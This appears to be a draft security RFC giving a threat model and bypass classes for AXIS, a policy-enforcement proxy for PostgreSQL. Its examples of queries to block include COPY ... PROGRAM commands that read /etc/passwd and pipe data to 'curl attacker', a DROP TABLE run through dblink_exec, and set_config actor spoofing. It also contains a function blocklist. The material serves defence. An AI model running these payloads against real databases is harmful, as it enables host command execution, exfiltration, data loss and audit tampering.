---
status: Draft RFC v1.2
applies_to: AXIS Native PostgreSQL Integration
last_reviewed: 2026-05-21
source_of_truth: repository markdown
---

# Threat Model and Bypasses

## Purpose

This document defines security threats, bypass classes, and required mitigations for AXIS Native PG mode.

AXIS is a policy enforcement point. It is not a WAF and not a guarantee that ALLOW means a query is safe. ALLOW means only that the query matched configured AXIS policy under observed context.

## Core Assets

- Protected production database write path.
- Policy decision integrity.
- Audit evidence integrity.
- Approval integrity.
- Actor attribution.
- Backend non-execution proof for blocked operations.
- Session/transaction state consistency.

## Threat Classes

| Threat | Risk | Default Posture |
|---|---|---|
| Parser mismatch | AXIS and PostgreSQL interpret SQL differently | Fail closed on ambiguity |
| Multi-statement bypass | Hidden write behind safe statement | Block entire message in PoC |
| COPY bypass | SQL-level or protocol-level bulk data path | Block all COPY in PoC |
| COPY FROM/TO PROGRAM | Host command execution risk under privileged DB | Always high risk |
| Function side effects | SELECT invokes write/DoS/unsafe action | Block unknown functions |
| search_path manipulation | Function/table resolution changes | Block/protect |
| role switching | Identity confusion | Block |
| protected GUC overwrite | Audit/identity tampering | Block |
| Extended Query template/param abuse | State split across Parse/Bind/Execute | Production prerequisite |
| CancelRequest bypass | Out-of-band cancel path | Production prerequisite |
| Timing side-channel | Policy boundaries inferred from latency | Mitigate in pilot |
| Large query DoS | Memory exhaustion | Enforce pre-buffer limit |
| Policy latency spike | Queue buildup and crash | Backpressure/fail closed |
| Metrics leakage | Sensitive labels expose metadata | Cardinality guardrails |

## COPY Detection

COPY is dangerous in two forms:

1. SQL command inside Simple Query, e.g. `COPY table FROM ...`.
2. PostgreSQL COPY subprotocol after backend accepts COPY.

AXIS Simple Query PoC must block COPY before backend dispatch.

Detection requirements:

- top-level SQL command classification;
- COPY variant detection;
- PROGRAM variant detection;
- no substring matching inside comments or string literals;
- ambiguous parsing fails closed.

Examples requiring block:

```sql
COPY users FROM STDIN;
COPY users TO STDOUT;
COPY users FROM PROGRAM 'cat /etc/passwd';
COPY users TO PROGRAM 'curl attacker';
```

## Function Side Effects

A `SELECT` can be dangerous:

```sql
SELECT update_salary(1, 50000);
SELECT set_config('axis.actor_id','evil',false);
SELECT pg_sleep(100);
SELECT dblink_exec('...', 'DROP TABLE users');
```

v1.2 policy posture:

- unknown functions are risky by default;
- known safe functions may be allowlisted;
- known dangerous functions must be blocklisted;
- functions affecting GUCs, roles, file access, network access, locks, sleeps, advisory locks, or extensions are high risk;
- function volatility metadata may help but is not enough by itself.

Recommended policy fields:

```json
{
  "function_policy": {
    "default": "block_unknown",
    "allowlist": ["lower", "upper", "count", "now"],
    "blocklist": ["pg_sleep", "set_config", "dblink_exec", "lo_import", "lo_export"]
  }
}
```

## Dollar-Quoting and Encoding

PostgreSQL dollar-quoting can hide keywords inside strings:

```sql
SELECT $$ DROP TABLE users $$;
SELECT $tag$ COPY users FROM PROGRAM 'x' $tag$;
```

AXIS must not classify SQL by raw keyword search. Parser/corpus tests must cover:

- dollar-quoted strings;
- escaped strings;
- Unicode identifiers;
- comments;
- mixed casing;
- null byte rejection;
- client encoding behavior.

## Large Query DoS

AXIS must enforce limits before unbounded allocation.

Required limits:

- max message length;
- max SQL text length;
- max parameter count;
- max parameter bytes;
- max pipeline backlog once pipeline support exists;
- max connection count per client;
- max risky decisions per actor/window.

Reject oversized messages with a controlled ErrorResponse and audit `oversized_query_rejected=true`.

## Timing Side-Channel

If BLOCK returns much faster than ALLOW, attackers can infer protected resources.

Mitigations for pilot:

- minimum response floor for policy denials where feasible;
- jitter for repeated policy probing;
- rate limit suspicious blocked probes;
- avoid revealing matched sensitive table names in client ErrorResponse;
- keep detailed reason in operator audit, not client response.

Do not add giant random delays to production traffic as a substitute for security. That is not defense; that is turning latency into incense.

## ErrorResponse Data Leakage

Client-visible errors must not expose:

- raw policy internals;
- sensitive table names unless already obvious from request;
- raw parameter values;
- backend topology;
- policy version hash unless acceptable;
- internal source file/routine.

Detailed information belongs in audit/control plane, not untrusted client output.

## AXIS ALLOW Misuse

AXIS ALLOW is not a vulnerability scanner result. It does not mean:

- query is injection-free;
- query is business-safe;
- query has correct input validation;
- query should be trusted forever;
- query is harmless under all database settings.

This must appear in customer-facing integration documentation.

## Current Known Weaknesses

- Full semantic equivalence with PostgreSQL is hard.
- Function side effects require schema/catalog awareness.
- Timing side-channel mitigation must be balanced against latency.
- Schema awareness is required for strong table-level policy authoring.

## Success Looks Like

AXIS fails closed on ambiguous PostgreSQL behavior instead of confidently allowing a query it only half understood.

## Failure Looks Like

A regex sees `SELECT`, PostgreSQL executes a dangerous function, and everyone gathers around the incident report pretending this was unforeseeable.
